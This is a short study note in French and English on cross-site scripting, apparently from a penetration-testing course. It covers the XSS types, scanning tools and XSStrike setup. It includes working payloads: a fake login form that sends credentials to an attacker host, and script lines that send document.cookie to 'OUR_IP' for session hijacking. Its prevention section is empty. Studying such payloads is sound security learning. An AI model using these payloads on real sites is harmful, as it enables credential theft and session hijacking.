# CROSS-SITE SCRIPTING (XSS)  

###### 3 types d'injection xss :
|**Type**|**Description**|
|---|---|
|Stored (Persistent) XSS|The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)|
|Reflected (Non-Persistent) XSS|Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)|
|DOM-based XSS|Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)|

## Bases

###### Stored (Persistent) XSS
* elle envoi l'input au backend 
###### Reflected XSS:
* elle se fait souvent ou parfois dans les URL des requettes , ex :
    ```URL
    http://159.65.81.48:30264/index.php?task=%27%3Cscript%3Ealert(document.cookie)%3C/script%3E%27
    ```
* elle envoi l'input au backend 
* non persistant 
###### DOM XSS
* exécuté en front
* non persistant
```html
<img src="" onerror=alert(window.origin)>
```

###### Vulnérability scanner 
* Burp Suite
* Zap
* Nessus


###### Tools de découverte

* XSS Strike
    ```bash
    git clone https://github.com/s0md3v/XSStrike.git
    cd XSStrike
    pip install -r requirements.txt
    python xsstrike.py

    python xsstrike.py -u "http://SERVER_IP:PORT/index.php?<Champ>=<Value>"
    ```
* Brute XSS

* XSSer

## XSS Attack
###### Defzcing attacks
* remplacer le contenu de la page

###### Phishing Attack
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();

```
* trouver un moyen de simuler une login page 
* mettre une redirection des requettes vers son serveur nc 
* envoyer le lien à la victime

###### Session Hijacking

```javascript
// load to remote script
<script src="http://OUR_IP/script.js"></script>
// get cookie
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
--- 
## Prevention


---

## Ressources
##### Payloads
* [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
* [Payload Box](https://github.com/payloadbox/xss-payload-list)
